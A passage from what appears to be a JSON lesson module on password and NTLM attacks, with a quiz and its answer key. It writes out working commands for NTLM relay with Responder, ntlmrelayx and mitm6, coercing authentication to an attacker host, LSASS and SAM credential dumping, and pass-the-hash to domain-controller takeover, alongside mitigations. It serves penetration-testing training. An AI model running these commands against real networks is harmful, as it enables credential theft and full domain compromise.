handle)\n\n# Start Responder\nresponder -I eth0 -wv\n```\n\n**Step 2**: Set up ntlmrelayx (relay to target)\n```bash\n# Relay to single target\nimpacket-ntlmrelayx -t 192.168.1.100 -smb2support\n\n# Relay to multiple targets\nimpacket-ntlmrelayx -tf targets.txt -smb2support\n\n# Execute command on relay\nimpacket-ntlmrelayx -t 192.168.1.100 -smb2support -c \"powershell -enc [base64_payload]\"\n\n# Dump SAM on relay\nimpacket-ntlmrelayx -t 192.168.1.100 -smb2support --sam\n```\n\n**Step 3**: Trigger authentication from victim\n```bash\n# Force victim to authenticate to attacker\n# Method 1: SMB link\necho \"@attacker_ip\\share\" | Out-File -FilePath \\\\victim\\c$\\temp\\link.txt\n\n# Method 2: Malicious file\n# Create .lnk file pointing to \\\\attacker_ip\\share\n\n# Method 3: Social engineering\n# Send email with UNC path: \\\\attacker_ip\\share\\document.docx\n```\n\n**Step 4**: Ntlmrelayx relays auth and you get access!\n\n### NTLM Relay with IPv6 + WPAD\n\n```bash\n# Start mitm6 (IPv6 DHCP + DNS spoofing)\nmitm6 -i eth0 -d contoso.com\n\n# Start ntlmrelayx\nimpacket-ntlmrelayx -6 -t ldaps://dc01.contoso.com -wh attacker.contoso.com -l loot\n```\n\n**What happens**:\n- mitm6 poisons IPv6 DNS\n- Victims try to connect to WPAD (proxy auto-config)\n- Ntlmrelayx captures and relays authentication\n- Creates domain computer accounts\n- Grants attacker privileges\n\n## Real-World Attack Chain\n\n**Scenario**: Penetration test for Contoso Corp\n\n**Phase 1: Initial Compromise**\n```bash\n# Phishing email with malicious .lnk file\n# Victim clicks, authenticates to attacker SMB server\nresponder -I eth0 -wv\n# Captured: workstation01$::CONTOSO:...\n```\n\n**Phase 2: Relay to Higher-Value Target**\n```bash\n# Relay captured auth to domain controller\nimpacket-ntlmrelayx -t 192.168.1.10 -smb2support --sam\n# Dumped SAM from DC, got local admin hash\n```\n\n**Phase 3: Pass-the-Hash to Lateral Movement**\n```bash\n# Use dumped hash to access other systems\ncrackmapexec smb 192.168.1.0/24 -u Administrator -H [dumped_hash]\n# Found 15 systems with same local admin password\n```\n\n**Phase 4: Credential Harvesting**\n```bash\n# Dump LSASS on all accessible systems\ncrackmapexec smb 192.168.1.0/24 -u Administrator -H [hash] -M lsassy\n# Found domain admin hash!\n```\n\n**Phase 5: Domain Compromise**\n```bash\n# Pass-the-Hash with domain admin\nimpacket-psexec -hashes :[domain_admin_hash] CONTOSO/DomainAdmin@dc01.contoso.com\n# Got SYSTEM on domain controller\n# Game over - full domain compromise\n```bash\n\n## Mitigations\n\n**Prevent PTH**:\n- ✅ Disable NTLM (use Kerberos only)\n- ✅ Implement SMB signing (prevents relay)\n- ✅ Use unique local admin passwords (LAPS)\n- ✅ Protected Users security group\n- ✅ Credential Guard\n\n**Prevent NTLM Relay**:\n- ✅ Enable SMB signing (required, not just enabled)\n- ✅ Disable LLMNR/NBT-NS\n- ✅ Use LDAP signing\n- ✅ Block outbound SMB (445) at firewall\n\n**PowerShell to enable SMB signing**:\n```powershell\nSet-SmbServerConfiguration -RequireSecuritySignature $true -Force\n```\n\n**Group Policy**:\n```\nComputer Configuration → Policies → Windows Settings → Security Settings → Local Policies → Security Options\n→ Microsoft network server: Digitally sign communications (always) = Enabled\n```"
      }
    },
    {
      "block_id": "f7a8b9c0-d1e2-4f34-9a0b-1c2d3e4f5a6b",
      "type": "memory_aid",
      "title": "Memory Aids for Password Attacks",
      "content": {
        "text": "## Password Attack Types\n\n**\"**O**nline **O**ffline **P**ass **C**redential\"** = **OOPC**\n- **O**nline attacks (Hydra, brute force services)\n- **O**ffline attacks (Hashcat, crack dumped hashes)\n- **P**ass-the-Hash (use hash without cracking)\n- **C**redential harvesting (Mimikatz, memory dumps)\n\n## Hydra Attack Syntax\n\n**\"**L**ogin **P**assword **P**rotocol **T**arget\"**\n- **L** = -l or -L (username or username list)\n- **P** = -p or -P (password or password list)\n- **P** = Protocol (ssh, rdp, http-post-form)\n- **T** = Target (IP or hostname)\n\n## Hashcat Attack Modes\n\n**\"**S**traight **C**ombination **B**rute **H**ybrid\"**\n- **S**traight = -a 0 (wordlist)\n- **C**ombination = -a 1 (two wordlists)\n- **B**rute-force = -a 3 (mask attack)\n- **H**ybrid = -a 6/7 (wordlist + mask)\n\n## Common Hash Lengths\n\n**\"32 40 64 60\"** = **MD5 SHA1 SHA256 bcrypt**\n- **32** hex chars = MD5 or NTLM\n- **40** hex chars = SHA-1\n- **64** hex chars = SHA-256\n- **60** chars = bcrypt ($2y$...)\n\n## Mask Attack Characters\n\n**\"**L**owercase **U**ppercase **D**igits **S**pecial **A**ll\"**\n- **?l** = Lowercase (a-z)\n- **?u** = Uppercase (A-Z)\n- **?d** = Digits (0-9)\n- **?s** = Special (!@#$%^&*)\n- **?a** = All of the above\n\n## Mimikatz Essential Commands\n\n**\"**P**rivilege **E**levate **L**ogon **S**AM **D**C\"**\n- **P**rivilege::debug (enable debug)\n- **E**levate (token::elevate)\n- **L**ogonpasswords (sekurlsa::logonpasswords)\n- **S**AM dump (lsadump::sam)\n- **D**CSync (lsadump::dcsync)\n\n## Pass-the-Hash Tools\n\n**\"**M**imikatz **C**rackMapExec **I**mpacket\"** = **MCI**\n- **M**imikatz (sekurlsa::pth)\n- **C**rackMapExec (cme smb -H)\n- **I**mpacket (psexec/wmiexec -hashes)\n\n## Password Spraying Strategy\n\n**\"**O**ne password, **M**any users\"**\n- NOT: Many passwords per user (causes lockout)\n- YES: One password across all users (avoids lockout)\n\n## Hash Cracking Workflow\n\n**\"**T**riage **W**ordlist **R**ules **M**ask **C**loud\"** = **TWRMC**\n1. **T**riage (top 1000 passwords, 2 min)\n2. **W**ordlist (rockyou, 30 min)\n3. **R**ules (wordlist + best64, 1 hr)\n4. **M**ask attack (common patterns, 6 hrs)\n5. **C**loud GPU (if needed, days/weeks)\n\n## NTLM Hash Format\n\n**\"LM:NTLM\" = \"empty:real\"**\n- LM hash (left of colon) = Usually empty (aad3b435b51404eeaad3b435b51404ee)\n- NTLM hash (right of colon) = The actual hash to use\n\n## Hydra HTTP POST Form\n\n**\"Path:Parameters:Failure\"**\n```\nhttp-post-form \"/login:user=^USER^&pass=^PASS^:F=Invalid\"\n```\n- Path = /login\n- Parameters = user=^USER^&pass=^PASS^\n- Failure string = F=Invalid\n\n## When to Use Which Attack\n\n**\"No access? Online. Got hashes? Offline. Windows? PTH.\"**\n- **No system access** → Online attacks (Hydra)\n- **Got password hashes** → Offline cracking (Hashcat)\n- **Windows + NTLM hash** → Pass-the-Hash (skip cracking!)\n- **Need passwords** → Credential harvesting (Mimikatz)\n\n## The Golden Rule\n\n**\"Always try Pass-the-Hash first on Windows - why crack when you can authenticate?\"**"
      }
    },
    {
      "block_id": "a8b9c0d1-e2f3-4a45-9b0c-1d2e3f4a5b6c",
      "type": "video",
      "title": "Video Tutorial: Password Attacks",
      "content": {
        "text": "## Recommended Video Resources\n\n**Hashcat Tutorials**:\n- [IppSec: Hashcat Tutorial](https://www.youtube.com/results?search_query=ippsec+hashcat) - Real HTB examples\n- [HackerSploit: Hashcat Password Cracking](https://www.youtube.com/watch?v=z4_oqTZJqCo) - 25 minutes\n\n**Mimikatz Demonstrations**:\n- [John Hammond: Mimikatz Explained](https://www.youtube.com/results?search_query=john+hammond+mimikatz)\n- [IppSec: Active Directory Walkthroughs](https://www.youtube.com/c/ippsec) - Search for AD machine names\n\n**Pass-the-Hash Attacks**:\n- [IppSec: Pass-the-Hash Techniques](https://www.youtube.com/results?search_query=ippsec+pass+the+hash)\n- Real-world lateral movement examples\n\n**Hydra Password Attacks**:\n- [NetworkChuck: Brute Force Attacks with Hydra](https://www.youtube.com/watch?v=J1q7QwQJSlY) - 15 minutes\n\n**NTLM Relay Attacks**:\n- Search YouTube: \"NTLM Relay mitm6 ntlmrelayx\"\n- [0xdf: NTLM Relay Explained](https://www.youtube.com/results?search_query=0xdf+ntlm+relay)\n\n**Practice Platforms**:\n- HackTheBox: Active, Sauna, Forest (AD password attacks)\n- TryHackMe: Active Directory rooms\n- OffSec Proving Grounds: AD practice labs\n\n**Key concepts to watch for**:\n- How Hashcat GPU acceleration works\n- Mimikatz LSASS memory dumping live\n- Real-time Pass-the-Hash lateral movement\n- NTLM relay attack demonstrations\n- Wordlist + rules effectiveness"
      }
    }
  ],
  "post_assessment": [
    {
      "question_id": "q1",
      "type": "multiple_choice",
      "question": "What is the main advantage of offline password attacks (hash cracking) over online password attacks?",
      "options": [
        "They work without obtaining password hashes first",
        "They are much faster and don't trigger account lockouts or detection systems",
        "They always succeed within minutes",
        "They work against any authentication system"
      ],
      "correct_answer": 1,
      "explanation": "Offline attacks are much faster (millions of attempts per second with GPU) and don't risk detection or account lockout since you're cracking hashes locally. However, you must first obtain the password hashes through dumping SAM, NTDS.dit, or memory.",
      "difficulty": 2
    },
    {
      "question_id": "q2",
      "type": "multiple_choice",
      "question": "In Hashcat, what does the mask '?u?l?l?l?l?l?d?d' represent?",
      "options": [
        "8 random characters",
        "Uppercase letter + 5 lowercase letters + 2 digits (e.g., Password12)",
        "User input placeholder",
        "Unicode characters"
      ],
      "correct_answer": 1,
      "explanation": "Hashcat mask syntax: ?u=uppercase, ?l=lowercase, ?d=digit. The mask ?u?l?l?l?l?l?d?d matches patterns like Password12, Summer24, Winter99, etc. This is useful for cracking corporate passwords that follow Uppercase+word+digits patterns.",
      "difficulty": 2
    },
    {
      "question_id": "q3",
      "type": "multiple_choice",
      "question": "Why does Pass-the-Hash work on Windows systems?",
      "options": [
        "NTLM authentication only requires the password hash, not the plaintext password",
        "Windows stores passwords in plaintext",
        "It exploits a Windows vulnerability",
        "It only works on outdated Windows versions"
      ],
      "correct_answer": 0,
      "explanation": "Pass-the-Hash works because NTLM authentication protocol authenticates users with their password hash directly. You don't need to crack the password - just provide the hash. This is not a vulnerability but a design characteristic of NTLM. Mitigation includes disabling NTLM, using Kerberos, and implementing Credential Guard.",
      "difficulty": 2
    },
    {
      "question_id": "q4",
      "type": "multiple_choice",
      "question": "What is the recommended strategy for password spraying to avoid account lockouts?",
      "options": [
        "Try 100 passwords against one user",
        "Try one common password against many users",
        "Use slow timing between attempts",
        "Only attack at night"
      ],
      "correct_answer": 1,
      "explanation": "Password spraying tries ONE password against MANY users, rather than many passwords against one user. This avoids triggering account lockout policies (typically 3-5 failed attempts). Example: Try 'Password123!' against all 100 users, then 'Welcome2024!' against all users, etc.",
      "difficulty": 2
    },
    {
      "question_id": "q5",
      "type": "multiple_choice",
      "question": "Which Mimikatz command dumps plaintext passwords and NTLM hashes from memory?",
      "options": [
        "mimikatz::passwords",
        "sekurlsa::logonpasswords",
        "lsadump::sam",
        "token::elevate"
      ],
      "correct_answer": 1,
      "explanation": "sekurlsa::logonpasswords extracts credentials from LSASS (Local Security Authority Subsystem Service) memory, including plaintext passwords (if WDigest enabled), NTLM hashes, and Kerberos tickets. This requires SeDebugPrivilege (enabled with privilege::debug) and local admin or SYSTEM rights.",
      "difficulty": 1
    }
  ],
  "mastery_threshold": 80,
  "jim_kwik_principles": [
    "active_learning",
    "teach_like_im_10",
    "memory_hooks",
    "gamify_it",
    "minimum_effective_dose",
    "meta_learning",
    "connect_to_what_i_know",
    "reframe_limiting_beliefs",
    "learning_sprint",
    "multiple_memory_pathways"
  ],
  "base_xp_reward": 250,
  "is_core_concept": true,
  "author": "CyberLearn Curriculum Team",
  "version": "1.0"
}